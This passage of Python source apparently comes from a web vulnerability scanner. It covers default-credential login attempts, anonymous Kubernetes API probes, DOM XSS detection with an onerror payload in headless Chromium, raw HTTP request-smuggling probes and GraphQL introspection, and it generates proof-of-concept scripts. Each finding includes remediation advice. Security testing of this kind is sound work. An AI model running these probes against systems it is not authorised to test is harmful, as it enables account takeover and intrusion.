                ["denied", "not authorized", "forbidden", "invalid", "incorrect",
                 "failed", "already", "no match"],
            ),
        )


# ---------------------------------------------------------------------------
# Default / weak credentials (runs once per target — gated to URLs that
# look like a login form, i.e. have BOTH a username-shaped and a
# password-shaped parameter)
# ---------------------------------------------------------------------------
#
# Deliberately a SMALL, bounded list of extremely common default pairs —
# not a wordlist spray. A real credential-spray/brute-force campaign is a
# genuinely different risk profile (many more requests, real lockout risk,
# usually its own dedicated tool with careful rate-limiting policy — this
# project's own separate ~/tools/otp-brute.py and hydra own that job). This
# is specifically the "did anyone leave admin/admin enabled" check that's
# safe, fast, and standard at the start of almost every real assessment.
# ---------------------------------------------------------------------------

_LOGIN_PARAM_RE = re.compile(r"^(user(name)?|login|email)$", re.I)
_PASSWORD_PARAM_RE = re.compile(r"^(pass(word)?|pwd)$", re.I)

_DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("test", "test"),
    ("guest", "guest"),
    ("root", "root"),
    ("administrator", "administrator"),
]


def _test_default_credentials(ctx, parts, pairs, baseline):
    param_names = [k for k, _ in pairs]
    user_param = next((p for p in param_names if _LOGIN_PARAM_RE.match(p)), None)
    pass_param = next((p for p in param_names if _PASSWORD_PARAM_RE.match(p)), None)
    if not user_param or not pass_param or user_param == pass_param:
        return  # doesn't look like a login form — nothing to try credentials against

    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout
    baseline_failed = bool(_FAILURE_INDICATOR_RE.search(baseline["body"]))

    for username, password in _DEFAULT_CREDENTIALS:
        if budget.exhausted():
            return
        new_pairs = []
        for k, v in pairs:
            if k == user_param:
                new_pairs.append((k, username))
            elif k == pass_param:
                new_pairs.append((k, password))
            else:
                new_pairs.append((k, v))

        url = _build_url(parts, new_pairs)
        resp = _polite_get(budget, delay, url, timeout)
        if resp is None:
            continue
        body = resp.text or ""
        if resp.status_code >= 400 or _DENIAL_PHRASE_RE.search(body):
            continue

        this_failed = bool(_FAILURE_INDICATOR_RE.search(body))
        if baseline_failed and not this_failed:
            _persist(
                ctx,
                title=f"Default/weak credentials accepted ('{username}' / '{password}')",
                severity="critical",
                category="Default Credentials",
                url=url, param=f"{user_param}/{pass_param}", payload=f"{username}:{password}",
                description=(
                    f"Submitting the common default credential pair '{username}'/'{password}' "
                    f"to this login form produced a response that no longer looks like a "
                    f"failed-login page, while the baseline request did — consistent with "
                    f"successful authentication using a default/weak, never-changed "
                    f"credential, found from a small built-in list of "
                    f"{len(_DEFAULT_CREDENTIALS)} well-known pairs (not a spray)."
                ),
                baseline_snippet=_ctx_snippet(baseline["body"], ""),
                mutated_snippet=_ctx_snippet(body, ""),
                impact=("Full account/administrative access using a credential pair that "
                       "requires no cracking or guessing beyond widely-known defaults."),
                remediation=("Never ship or deploy with default credentials. Force a "
                            "credential change on first login, and enforce a minimum "
                            "password policy that default values can't satisfy."),
            )
            return  # one confirmed default-credential pair is enough evidence


# ---------------------------------------------------------------------------
# Exposed Kubernetes / kubelet management API (runs once per target)
# ---------------------------------------------------------------------------
#
# A genuine container/cluster ESCAPE (breaking out of a running container's
# namespace) needs to run FROM INSIDE that container — not something a
# remote HTTP tester can ever do, correctly out of scope for this engine.
# But the kubelet API (:10250) and the Kubernetes API server (:6443) are
# both plain HTTPS REST APIs, and "anonymous-auth left enabled" on either
# is a real, well-known, historically common finding (CIS Kubernetes
# Benchmark 4.2.1, and a mainstay of real cloud pentests/bug bounty) — an
# unauthenticated kubelet leaks full pod data (including mounted secrets
# and env vars) via /pods, and its /run//<namespace>/<pod>/<container>
# endpoint is a direct remote command execution primitive if reachable
# without auth. That slice is genuinely testable the same way as any other
# HTTP endpoint.
# ---------------------------------------------------------------------------

_K8S_API_URL_RE = re.compile(
    r":10250\b|:6443\b|/api/v1/pods\b|/api/v1/namespaces\b|(?<![\w/])/pods\b", re.I
)
_K8S_PROBE_PATHS = ["/pods", "/api/v1/pods", "/api/v1/namespaces"]
_K8S_LEAK_KINDS = {"PodList", "NamespaceList", "ServiceList", "SecretList"}


def _test_exposed_k8s_api(ctx, target_url):
    # Deliberately does NOT match a bare `/api/v1` prefix — that matches
    # any conventionally-versioned REST API (`/api/v1/users`,
    # `/api/v1/products`, ...), not just Kubernetes, and would have fired
    # constantly against ordinary APIs in --all/wayback-driven runs. Every
    # remaining alternative here is genuinely Kubernetes-specific.
    if not _K8S_API_URL_RE.search(target_url):
        return
    parts = urlsplit(target_url)
    base = f"{parts.scheme}://{parts.netloc}"

    for probe_path in _K8S_PROBE_PATHS:
        if ctx.budget.exhausted():
            return
        time.sleep(ctx.delay)
        ctx.budget.spend()
        try:
            # Kubelet/API-server certs are near-universally self-signed —
            # verify=False is required to even connect, not a corner cut.
            # Suppress the resulting urllib3 warning explicitly rather
            # than letting it spam the console on every probe.
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                resp = requests.get(base + probe_path, timeout=ctx.timeout, verify=False,
                                    headers=_UA_HEADERS)
        except Exception:
            continue
        if resp.status_code != 200:
            continue
        body = resp.text or ""
        # Real JSON-shape validation, not a substring check — '"kind"' and
        # '"items"' are common key NAMES in plenty of non-Kubernetes list
        # APIs too; only a genuine PodList/NamespaceList/etc. "kind" value
        # counts as a real leak.
        leaked = False
        try:
            data = json.loads(body)
            leaked = isinstance(data, dict) and data.get("kind") in _K8S_LEAK_KINDS
        except Exception:
            pass

        if leaked:
            _persist(
                ctx,
                title=f"Exposed unauthenticated Kubernetes API ({probe_path})",
                severity="critical",
                category="Exposed Kubernetes/Kubelet API",
                url=base + probe_path, param="(no authentication required)", payload=probe_path,
                description=(
                    f"Requesting {probe_path} with no authentication at all returned real "
                    f"cluster data (a genuine PodList/NamespaceList response shape, not a "
                    f"generic page) — consistent with anonymous-auth being left enabled on "
                    f"the kubelet or Kubernetes API server. If this is the kubelet API "
                    f"specifically, its /run or /exec endpoints are typically reachable the "
                    f"same way, which is a direct remote command execution primitive, not "
                    f"just an information leak."
                ),
                baseline_snippet="N/A (unauthenticated-access check, no body comparison)",
                mutated_snippet=_ctx_snippet(body, "", maxlen=500),
                impact=("Full cluster reconnaissance (every pod, its images, mounted secret "
                       "names, and environment variables) with zero credentials, and — if "
                       "this is the kubelet API — likely remote code execution inside any "
                       "pod on this node via its exec/run endpoints."),
                remediation=("Set --anonymous-auth=false on every kubelet, and enforce RBAC "
                            "with no anonymous/system:unauthenticated bindings on the API "
                            "server. Never expose either directly to the internet — restrict "
                            "to the cluster's internal network only."),
                poc_verify=False,
            )
            return


# ---------------------------------------------------------------------------
# DOM-based XSS (runs once per target) — the one check in this entire file
# that does NOT work by inspecting raw HTTP response text at all. Every
# other XSS check above (reflected: step 1 of _test_param; stored: step 10
# of _test_param) proves its finding by finding an unescaped payload
# somewhere in the literal bytes of an HTTP response. That structurally
# cannot detect DOM-based XSS, where the vulnerable code path is entirely
# client-side JavaScript that reads an attacker-controlled source
# (location.hash, location.search, document.referrer, ...) and writes it
# into a dangerous DOM sink (innerHTML, document.write, eval, ...) without
# ever being echoed by the server at all.
#
# This uses a REAL headless Chromium via Playwright — not a simulation —
# and proves genuine execution (not text matching) the same way
# webapp/tests/test_e2e.py already proves the ABSENCE of XSS execution for
# the web dashboard: register a listener for the `dialog` event, which
# Chromium fires if and only if a live alert()/confirm()/prompt() call
# actually runs. This check is DOM-XSS's mirror of that same technique,
# proving PRESENCE instead of absence.
# ---------------------------------------------------------------------------

_DOM_XSS_SETTLE_MS = 800  # bounded wait after navigation for async DOM writes
                          # (e.g. code behind a setTimeout/event handler) to
                          # fire before giving up on this payload — long
                          # enough for realistic client-side logic, short
                          # enough that one target with several parameters
                          # doesn't turn into a multi-minute hang.


def _dom_xss_payload(canary):
    """A <img onerror=...> payload, not a <script> tag. This matters: the
    DOM spec deliberately does NOT execute a <script> element inserted via
    innerHTML (or equivalent), so a script-tag payload would silently fail
    to prove anything about an innerHTML-style sink even when the sink is
    genuinely vulnerable. An <img> (or <svg onload=...>) element's event
    handler DOES fire when inserted this way — it's the standard, correct
    real-world proof payload for innerHTML/document.write-class DOM sinks,
    not a special trick."""
    return f"<img src=x onerror=alert('{canary}')>"


def _dom_xss_probe(page, url, nav_timeout_ms):
    """Navigate to `url` in a real Playwright page, listen for a genuine
    `dialog` event, and return the dialog's message if one fired within
    the bounded settle window, else None. Any navigation error (DNS
    failure, connection refused, etc.) is swallowed and treated as "no
    dialog fired" — a nav failure here means something environment-
    specific went wrong, not that a vulnerability was disproven; the
    baseline capture earlier in cmd_active already proved this target
    responds to plain HTTP."""
    fired = []

    def _on_dialog(dialog):
        fired.append(dialog.message)
        try:
            dialog.dismiss()
        except Exception:
            pass  # page may already be navigating away — nothing to do

    page.on("dialog", _on_dialog)
    try:
        page.goto(url, timeout=nav_timeout_ms, wait_until="load")
        page.wait_for_timeout(_DOM_XSS_SETTLE_MS)
    except Exception:
        pass
    finally:
        page.remove_listener("dialog", _on_dialog)

    return fired[0] if fired else None


def _gen_dom_xss_poc(url, canary, vector_label):
    """A DOM-XSS finding is proven by real JavaScript execution in a real
    browser — the generic single-request gen_python_poc() (a plain
    requests.get() substring check) is MEANINGLESS here, the exact same
    problem race conditions and HTTP smuggling already hit above (see
    _gen_race_poc / _gen_smuggling_poc): a finding that isn't reproducible
    by one plain request needs a PoC that actually re-creates the real
    mechanism, not a generic template that would just prove the payload
    sits somewhere in a response body — which was never the point, and for
    the URL-fragment vector specifically isn't even true (a fragment is
    never sent to the server at all, so requests.get() can't even
    construct a meaningful reproduction of that vector).
    This writes a standalone Playwright script that re-navigates to the
    exact URL and re-listens for the same live `dialog` event this
    check's own detector used."""
    return f'''#!/usr/bin/env python3
# PoC: DOM-based XSS ({vector_label}) reproduction
# Target: {url!r}
# Loads the exact URL in a real headless Chromium and listens for the
# `dialog` event, which only fires for a genuinely EXECUTING
# alert()/confirm()/prompt() call — never for inert/escaped text. This is
# the only way to actually prove a DOM-XSS finding; a plain requests.get()
# text search cannot, since the vulnerable code path is entirely
# client-side JavaScript that never has to touch the raw HTTP response
# body (and, for a URL-fragment vector, never even reaches the server).
# Run: pip install playwright && python3 -m playwright install chromium
#      && python3 <this file>

import sys
from playwright.sync_api import sync_playwright

URL = {url!r}
EXPECTED_CANARY = {canary!r}


def main() -> int:
    fired = []

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        def handle_dialog(dialog):
            fired.append(dialog.message)
            dialog.dismiss()

        page.on("dialog", handle_dialog)
        try:
            page.goto(URL, timeout=15000, wait_until="load")
            page.wait_for_timeout(800)
        except Exception as exc:
            print(f"[FAIL] Navigation error: {{exc}}")
            browser.close()
            return 1
        browser.close()

    if fired and EXPECTED_CANARY in fired[0]:
        print(f"[PASS] DOM XSS reproduced -- live dialog fired: {{fired[0]!r}}")
        return 0
    print(f"[FAIL] No matching dialog fired this run (got: {{fired!r}}) -- target may "
          f"be patched, or timing/environment-sensitive; re-run or raise the settle wait")
    return 1


if __name__ == "__main__":
    sys.exit(main())
'''


def _test_dom_xss(ctx, target_url):
    """Scope decision: tests the URL FRAGMENT first, unconditionally, on
    EVERY target regardless of whether it has query parameters — a
    `#<payload>` fragment is never transmitted to the server at all (per
    the URL spec, browsers strip it before the request line is even
    built), so it is invisible to literally every other check this entire
    tool performs, all of which work over raw HTTP requests/responses.
    This is arguably the single most valuable capability this check adds:
    real attack surface nothing else here can reach at all. It then tests
    each existing query parameter the same way — a DOM sink reading
    location.search/URLSearchParams is just as real a bug and just as
    invisible to the reflected/stored XSS checks in _test_param above
    (those only fire when the SERVER echoes the payload back into the
    response body verbatim; a client-side `URLSearchParams(location
    .search).get(...)` read never shows up in the server's response text
    at all, even though the parameter genuinely reaches the server on the
    wire this time).

    Resource-cost decision: ONE browser instance is launched and reused
    for every payload tried against this target (fragment + each query
    parameter), then closed — not relaunched per-payload. A real Chromium
    launch is two to three orders of magnitude heavier than a single
    requests.get() call (a real OS process, a real rendering/JS engine);
    relaunching per parameter on a URL with several parameters would be a
    wildly disproportionate cost increase for what is fundamentally still
    one target. Each navigation still spends one unit of the shared
    request budget and respects ctx.delay between navigations, same
    politeness philosophy as every other check in this file.

    No AI escalation here, matching _test_race_condition's reasoning: a
    live `dialog` firing in a real browser after a payload navigation is
    about as close to direct proof as this engine gets — there's no
    ambiguous signal left to hand to a human-judgment call.
    """
    if not HAS_PLAYWRIGHT:
        ctx.console.print(
            "  [dim]DOM-XSS check skipped — Playwright is not installed "
            "(pip install playwright && python3 -m playwright install chromium). "
            "Every other check in this run is unaffected.[/dim]"
        )
        return
    if ctx.budget.exhausted():
        return

    parts = urlsplit(target_url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    nav_timeout_ms = max(int(ctx.timeout * 1000), 3000)

    # Build the (label, url, param-name, payload, canary) tuples to try —
    # fragment always first (see docstring), then one per existing query
    # parameter. Each gets its own unique canary so a dialog firing can be
    # matched back to exactly which vector triggered it.
    to_try = []

    canary_frag = f"hkzdom{secrets.token_hex(5)}"
    frag_payload = _dom_xss_payload(canary_frag)
    frag_url = urlunsplit((parts.scheme, parts.netloc, parts.path, parts.query, frag_payload))
    to_try.append(("URL fragment (location.hash)", frag_url, "(fragment)",
                   frag_payload, canary_frag))

    # Query-param URLs are built with the fragment explicitly cleared (NOT
    # via _build_url(parts, ...) directly, which would preserve whatever
    # fragment `target_url` originally had). Found while verifying this
    # check against testlab: if the target URL passed on the command line
    # already carries a payload-shaped fragment (e.g. a user re-testing the
    # exact URL a previous fragment finding used), that leftover fragment
    # payload rides along into every query-param navigation too, since it's
    # a genuinely separate live sink on the same page. Two <img onerror=...>
    # elements on one page both fire real, independently-async load-failure
    # events — Chromium doesn't guarantee DOM-insertion-order firing (it
    # depends on the image "load" scheduler) — so the canary this function
    # is actually testing for can end up as fired[1] instead of fired[0],
    # or vice versa, run to run: a real, observed source of flaky
    # non-determinism, not a hypothetical one. Clearing the fragment here
    # ensures exactly one live payload per navigation, which is what makes
    # canary-matching deterministic.
    parts_no_frag = parts._replace(fragment="")
    for pname, _orig_val in pairs:
        canary_p = f"hkzdom{secrets.token_hex(5)}"
        payload_p = _dom_xss_payload(canary_p)
        url_p = _build_url(parts_no_frag, _with_param(pairs, pname, payload_p))
        to_try.append((f"query parameter '{pname}'", url_p, pname, payload_p, canary_p))

    browser = None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()

            for label, url, pname, payload, canary in to_try:
                if ctx.budget.exhausted():
                    break
                time.sleep(ctx.delay)
                ctx.budget.spend()

                fired_message = _dom_xss_probe(page, url, nav_timeout_ms)
                if fired_message is None or canary not in fired_message:
                    continue

                is_fragment = pname == "(fragment)"
                if is_fragment:
                    description = (
                        f"Loading this target with a JavaScript-executing payload in the "
                        f"URL FRAGMENT (`#{payload}`) caused a live alert() to fire in a "
                        f"real headless Chromium browser — genuine JavaScript execution, "
                        f"confirmed via Chromium's own `dialog` event, not a text match. "
                        f"This attack surface is invisible to EVERY OTHER check `hakuza "
                        f"active` performs: a URL fragment is a purely client-side "
                        f"construct that browsers never transmit to the server at all, so "
                        f"no request/response diffing or text-matching of any kind — "
                        f"including this tool's own reflected/stored XSS checks — can ever "
                        f"observe it. The vulnerability lives entirely in client-side "
                        f"JavaScript that reads `location.hash` (or an equivalent "
                        f"client-side-only source) and writes it into a dangerous DOM sink "
                        f"(e.g. `innerHTML`, `document.write`) with no sanitization."
                    )
                else:
                    description = (
                        f"Loading this target with the '{pname}' query parameter set to a "
                        f"JavaScript-executing payload caused a live alert() to fire in a "
                        f"real headless Chromium browser — genuine JavaScript execution, "
                        f"confirmed via Chromium's own `dialog` event, not a text match. "
                        f"Unlike the reflected/stored XSS checks elsewhere in this tool "
                        f"(which only detect a vulnerability when the SERVER echoes the "
                        f"payload back into the raw HTML response body), this payload never "
                        f"appears anywhere in the server's response text at all — confirm "
                        f"this yourself by diffing the baseline body against the response "
                        f"body for this URL, the payload is absent from both. The "
                        f"vulnerable code path is client-side JavaScript reading the value "
                        f"directly out of `location.search`/`URLSearchParams` and writing "
                        f"it into a dangerous DOM sink (e.g. `innerHTML`) with no "
                        f"sanitization — exactly the class of bug that made this check "
                        f"necessary in the first place, since every other check in this "
                        f"tool only ever looks at server response text."
                    )

                _persist(
                    ctx,
                    title=f"DOM-based XSS via {label}",
                    severity="high",
                    category="Cross-Site Scripting (DOM-based)",
                    url=url, param=pname, payload=payload,
                    description=description,
                    baseline_snippet=(
                        "N/A — DOM-based XSS is proven by real JavaScript execution in a "
                        "headless browser (a live `dialog` event), not by an HTTP "
                        "response-text diff; there is no meaningful baseline/mutated "
                        "response-body comparison for this check. See extra_evidence."
                    ),
                    mutated_snippet=(
                        f"Live browser proof: Chromium fired a real alert() dialog after "
                        f"navigating to the payload URL. Dialog message: {fired_message!r}"
                    ),
                    impact=(
                        "An attacker can execute arbitrary JavaScript in victims' browsers "
                        "in this site's security context — session hijacking, credential "
                        "theft, or full account takeover via a crafted link. Because the "
                        "vulnerable code runs entirely client-side, this class is also "
                        "unusually resistant to server-side defenses like input validation "
                        "or a WAF, neither of which ever sees the payload at all when it "
                        "arrives via the URL fragment."
                    ),
                    remediation=(
                        "Never pass unsanitized data from location.hash, location.search, "
                        "document.referrer, or any other client-controlled source into a "
                        "dangerous DOM sink (innerHTML, document.write, eval, "
                        "setAttribute() with an event-handler/href/src attribute, etc.). "
                        "Use safe DOM APIs (textContent, safe attribute values) or a "
                        "sanitization library (e.g. DOMPurify) before writing untrusted "
                        "data into the DOM. Adopt a strict Content-Security-Policy "
                        "(specifically script-src without 'unsafe-inline') as defense in "
                        "depth — CSP is one of the few server-side controls that CAN "
                        "mitigate DOM XSS, since it constrains what the browser will "
                        "execute no matter how the payload arrived."
                    ),
                    extra_evidence=(
                        f"Detection mechanism: Playwright (headless Chromium), a real "
                        f"`dialog` event listener — not a text-match heuristic. Vector: "
                        f"{label}. Canary: {canary}. "
                        f"See the generated PoC script for standalone reproduction "
                        f"(requires: pip install playwright && "
                        f"python3 -m playwright install chromium)."
                    ),
                    custom_poc_script=_gen_dom_xss_poc(url, canary, label),
                )

            page.close()
            browser.close()
            browser = None  # closed cleanly while the driver connection is
                             # still alive — nothing left for the except
                             # handler below to clean up on the happy path
    except Exception as exc:
        ctx.console.print(f"  [yellow]DOM-XSS check failed to run: {_rich_escape(str(exc))}[/yellow]")
        # Only reached if launch/navigation raised BEFORE the clean close
        # above — browser.close() here runs after the `with` block (and its
        # driver connection) has already unwound, so it's a best-effort
        # safety net, not the primary cleanup path.
        if browser is not None:
            try:
                browser.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# HTTP Request Smuggling (runs once per target) — the one check in this
# file that abandons the `requests` library entirely for raw sockets,
# since smuggling is fundamentally about ambiguous request framing
# (conflicting Content-Length and Transfer-Encoding headers) that a
# well-behaved HTTP client library won't let you construct in the first
# place.
# ---------------------------------------------------------------------------
#
# Sends the two classic desync probes from PortSwigger's documented
# methodology (CL.TE, TE.CL) and TIMES the response. The signature this
# looks for: a server that hangs waiting for bytes that will never arrive,
# because it parsed the body boundary using the header OTHER than the one
# actually satisfied by what the client sent.
#
# Important honesty note, also reflected in severity below: this timing
# technique is most reliable against a real front-end/back-end split (a
# CDN or reverse proxy in front of an app server — how most real targets
# are actually deployed), where the two tiers genuinely disagree on
# framing. Against a single monolithic server the signal can be
# ambiguous, so this is always reported as a LEAD needing manual
# confirmation with a dedicated exploitation tool (e.g. Burp's HTTP
# Request Smuggler), never as a definitively confirmed finding — the same
# honesty standard already applied to the boolean-blind SQLi and IDOR
# heuristics elsewhere in this file. HTTP only in v1 — raw sockets plus
# manual TLS wrapping for HTTPS targets is real added complexity not yet
# built.
# ---------------------------------------------------------------------------

_SMUGGLE_CLTE_TEMPLATE = (
    "POST {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: close\r\n"
    "\r\n"
    "1\r\nA\r\nX"
)

_SMUGGLE_TECL_TEMPLATE = (
    "POST {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 3\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: close\r\n"
    "\r\n"
    "8\r\nSMUGGLED\r\n0\r\n\r\n"
)


def _raw_send_and_time(host, port, raw_bytes, connect_timeout, read_timeout):
    """Open a fresh TCP connection, send raw bytes exactly as given (no
    header validation/normalization — the whole point), and measure how
    long it takes to get ANY response back. Returns (elapsed_seconds,
    got_response, timed_out). Never raises — a connection failure just
    means no signal, not an error to propagate."""
    try:
        s = socket.create_connection((host, port), timeout=connect_timeout)
    except Exception:
        return None, False, False
    try:
        t0 = time.monotonic()
        try:
            s.sendall(raw_bytes)
            s.settimeout(read_timeout)
            data = s.recv(8192)
            return time.monotonic() - t0, bool(data), False
        except socket.timeout:
            return time.monotonic() - t0, False, True
        except Exception:
            # Genuinely reachable, not hypothetical: the smuggling probes
            # deliberately send malformed/ambiguous chunked framing, and a
            # real server or proxy resetting the connection on receipt
            # (ConnectionResetError/BrokenPipeError from sendall(), or any
            # other socket-level failure) is a plausible outcome — this
            # function's whole contract is "never raises", so sendall()
            # and settimeout() need the same coverage recv() already had.
            return None, False, False
    finally:
        s.close()


def _gen_smuggling_poc(host, port, path, label, raw_probe_bytes, threshold, baseline_elapsed):
    """The generic single-request gen_python_poc() (a plain requests.get())
    is meaningless here — it can't reproduce a raw-socket timing signature
    any more than it could for a race condition (same problem, same fix:
    a dedicated PoC using the actual mechanism, not the generic template).
    This writes a standalone script that resends the EXACT raw probe bytes
    over a real socket and re-measures elapsed time, so re-running it
    actually re-tests the desync rather than trivially failing forever.
    raw_probe_bytes is computed by the caller and embedded as a literal
    bytes repr — no re-templating inside the generated script, which
    avoids nested-escaping bugs entirely."""
    baseline_req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
    return f'''#!/usr/bin/env python3
# PoC: HTTP Request Smuggling ({label} desync pattern) reproduction
# Target: {host}:{port}{path}
# Resends the exact raw probe over a real socket and re-measures response
# time — this class of finding cannot be reproduced by a normal
# requests.get(), only by re-creating the actual raw framing ambiguity.
# Run: python3 <this file>  (stdlib only, no dependencies)

import socket
import sys
import time

HOST = {host!r}
PORT = {port!r}
THRESHOLD = {threshold!r}
RAW_PROBE = {raw_probe_bytes!r}
RAW_BASELINE = {baseline_req!r}


def send_and_time(raw_bytes, read_timeout):
    s = socket.create_connection((HOST, PORT), timeout=10)
    try:
        s.sendall(raw_bytes)
        s.settimeout(read_timeout)
        t0 = time.monotonic()
        try:
            s.recv(8192)
            return time.monotonic() - t0
        except socket.timeout:
            return time.monotonic() - t0
    finally:
        s.close()


def main() -> int:
    baseline = send_and_time(RAW_BASELINE, 10)
    print(f"Baseline response time: {{baseline:.2f}}s")

    probe = send_and_time(RAW_PROBE, THRESHOLD + 5)
    print(f"{label} probe response time: {{probe:.2f}}s (original threshold: {threshold:.2f}s, "
          f"original baseline: {baseline_elapsed:.2f}s)")

    if probe >= THRESHOLD:
        print("[PASS] Desync timing signature reproduced")
        return 0
    print("[FAIL] Response was fast this run -- may be patched, or timing is "
          "environment-sensitive; treat as a lead either way, confirm with a "
          "dedicated exploitation tool")
    return 1


if __name__ == "__main__":
    sys.exit(main())
'''


def _test_smuggling(ctx, target_url):
    parts = urlsplit(target_url)
    if parts.scheme != "http":
        return  # v1: HTTP only, see module-level docstring above
    if ctx.budget.exhausted():
        return
    host = parts.hostname
    port = parts.port or 80
    path = parts.path or "/"

    baseline_req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
    baseline_elapsed, baseline_ok, _ = _raw_send_and_time(
        host, port, baseline_req, connect_timeout=ctx.timeout, read_timeout=ctx.timeout,
    )
    ctx.budget.spend()
    if not baseline_ok or baseline_elapsed is None:
        return  # couldn't establish a normal raw-socket baseline — don't guess further

    # Same statistical-gate spirit as the time-based SQLi check elsewhere
    # in this file: gate on how far a probe's timing sits outside THIS
    # target's own observed baseline, not a fixed ">N seconds" rule.
    threshold = max(baseline_elapsed * 4, 2.0)
    read_timeout = min(threshold + 2, ctx.timeout + 8)  # bounded — never wait indefinitely

    hit = None
    for label, template in (("CL.TE", _SMUGGLE_CLTE_TEMPLATE), ("TE.CL", _SMUGGLE_TECL_TEMPLATE)):
        if ctx.budget.exhausted():
            break
        raw = template.format(path=path, host=host).encode()
        elapsed, _got, timed_out = _raw_send_and_time(
            host, port, raw, connect_timeout=ctx.timeout, read_timeout=read_timeout,
        )
        ctx.budget.spend()
        if elapsed is None:
            continue
        if timed_out or elapsed >= threshold:
            hit = (label, elapsed, raw)
            break

    if hit is None:
        return
    label, elapsed, raw_probe_bytes = hit
    _persist(
        ctx,
        title=f"Potential HTTP Request Smuggling ({label} desync pattern) — needs manual confirmation",
        severity="high",
        category="HTTP Request Smuggling",
        url=target_url, param="(raw request framing)", payload=f"{label} probe",
        description=(
            f"A {label}-style probe (conflicting Content-Length and Transfer-Encoding "
            f"headers, constructed to expose exactly which one this server honors) took "
            f"{elapsed:.2f}s to respond, versus a {baseline_elapsed:.2f}s baseline — "
            f"consistent with the server waiting for bytes that were never going to "
            f"arrive, because it parsed the body boundary using the OTHER header than "
            f"the one actually satisfied. This timing technique is most reliable against "
            f"a real front-end/back-end split (a CDN or reverse proxy in front of an app "
            f"server); against a single server the signal can be ambiguous, so this is a "
            f"LEAD, not a confirmed finding — verify with a dedicated exploitation tool "
            f"(e.g. Burp's HTTP Request Smuggler) before reporting this as confirmed."
        ),
        baseline_snippet=f"baseline (normal GET) response time: {baseline_elapsed:.2f}s",
        mutated_snippet=f"{label} probe response time: {elapsed:.2f}s (threshold {threshold:.2f}s)",
        impact=("If confirmed, request smuggling can bypass front-end security controls, "
               "poison other users' requests/responses (including stealing their "
               "responses or hijacking their sessions), or bypass authentication "
               "entirely — one of the highest-impact web vulnerability classes when it "
               "lands on shared infrastructure."),
        remediation=("Reject or normalize requests with both Content-Length and "
                    "Transfer-Encoding present at every tier (front-end and back-end); "
                    "prefer HTTP/2 end-to-end where possible, which has no equivalent "
                    "framing ambiguity."),
        custom_poc_script=_gen_smuggling_poc(
            host, port, path, label, raw_probe_bytes, threshold, baseline_elapsed,
        ),
    )


# ---------------------------------------------------------------------------
# GraphQL introspection (runs once per target — gated to URLs that look
# like a GraphQL endpoint)
# ---------------------------------------------------------------------------

_GRAPHQL_URL_RE = re.compile(r"graphql|/gql\b", re.I)
_GRAPHQL_INTROSPECTION_QUERY = "{__schema{queryType{name}types{name kind}}}"


def _test_graphql_introspection(ctx, target_url):
    """Many real GraphQL servers (Apollo Server, GraphQL Yoga, Django
    Graphene, and others) accept queries via a plain GET ?query= param for
    convenience and CDN cache-ability — no POST body needed to test this.
    Introspection (a client asking the schema to describe itself) is a
    standard GraphQL feature, but leaving it enabled for anonymous callers
    in production hands an attacker the complete API surface — every type,
    field, and mutation name, including ones never meant to be discovered
    by probing — a real, common, and well-known GraphQL misconfiguration."""
    if not _GRAPHQL_URL_RE.search(target_url):
        return
    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout
    if budget.exhausted():
        return

    parts = urlsplit(target_url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    new_pairs = [(k, v) for k, v in pairs if k != "query"] + [("query", _GRAPHQL_INTROSPECTION_QUERY)]
    url = _build_url(parts, new_pairs)
    resp = _polite_get(budget, delay, url, timeout)
    if resp is None:
        return
    body = resp.text or ""

    type_names = []
    try:
        data = json.loads(body)
        schema = (data.get("data") or {}).get("__schema") if isinstance(data, dict) else None
        if isinstance(schema, dict) and isinstance(schema.get("types"), list):
            type_names = [t.get("name") for t in schema["types"] if isinstance(t, dict) and t.get("name")]
    except Exception:
        pass

    # Fall back to a text-based check in case the response isn't the exact
    # shape expected above but still clearly leaked real schema data.
    schema_leaked = len(type_names) >= 3 or (
        '"__schema"' in body and '"types"' in body and body.count('"name"') >= 5
    )
    if not schema_leaked:
        return

    sample = ", ".join(type_names[:12]) if type_names else _ctx_snippet(body, "__schema", maxlen=300)
    _persist(
        ctx,
        title="GraphQL Introspection Enabled",
        severity="medium",
        category="GraphQL Misconfiguration",
        url=url, param="query", payload=_GRAPHQL_INTROSPECTION_QUERY,
        description=(
            f"Sending a standard GraphQL introspection query via GET (?query=...) returned "
            f"the real schema — {len(type_names) or 'several'} type name(s) leaked, e.g. "
            f"\"{sample[:200]}\". Introspection is a normal GraphQL feature, but leaving it "
            f"enabled for anonymous callers hands an attacker the complete API surface "
            f"without needing to guess or brute-force field/mutation names."
        ),
        baseline_snippet="N/A (introspection-only check, no body comparison)",
        mutated_snippet=f"Leaked types: {sample}",
        impact=("The full schema — every type, field, and mutation, including internal or "
               "unlinked ones never meant to be discovered — becomes directly enumerable, "
               "significantly narrowing the work needed to find a real vulnerability "
               "(e.g. an admin mutation with no authorization check)."),
        remediation=("Disable introspection for anonymous/production traffic (most GraphQL "
                    "frameworks support this via a single config flag), or require "
                    "authentication before introspection queries are answered."),
        custom_poc_script=_gen_graphql_poc(url, "GraphQL Misconfiguration"),
    )


# ---------------------------------------------------------------------------
# CORS misconfiguration (runs once per target — a response-header property,
# not a per-parameter injection point)
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Web Cache Deception (runs once per target — a URL-routing property, not a
# per-parameter injection point)
# ---------------------------------------------------------------------------
#
# A genuinely different mechanism from everything else in this file: not an
# injection at all, but a routing-confusion bug. Many frameworks/reverse
# proxies greedily match a route prefix and ignore trailing path segments,
# or strip path-parameters (;foo) before routing but leave them in the raw
# path a downstream cache keys on. Appending a fake static-looking filename
